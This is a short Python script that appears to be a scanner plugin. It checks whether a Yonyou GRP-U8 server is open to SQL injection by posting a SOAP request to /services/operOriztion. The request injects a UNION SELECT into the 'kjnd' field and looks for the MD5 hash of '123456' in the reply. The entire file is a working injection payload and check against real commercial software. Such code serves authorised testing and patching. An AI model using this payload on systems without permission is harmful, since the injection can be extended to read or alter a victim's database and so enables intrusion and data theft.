import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友GRP-U8-operOriztion存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Content-Type': 'text/xml;charset=UTF-8',
        'SOAPAction': '""'
    }
    data = '''<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
    <soapenv:Header/>
    <soapenv:Body>
    <wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <kjnd xsi:type="xsd:string">' UNION ALL SELECT sys.fn_sqlvarbasetostr(HashBytes('MD5','123456'))-- </kjnd>
    </wsdd:getGsbmfaByKjnd>
    </soapenv:Body>
    </soapenv:Envelope>'''
    vurl = urllib.parse.urljoin(url, "/services/operOriztion")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'e10adc3949ba59abbe56e057f20f883e' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult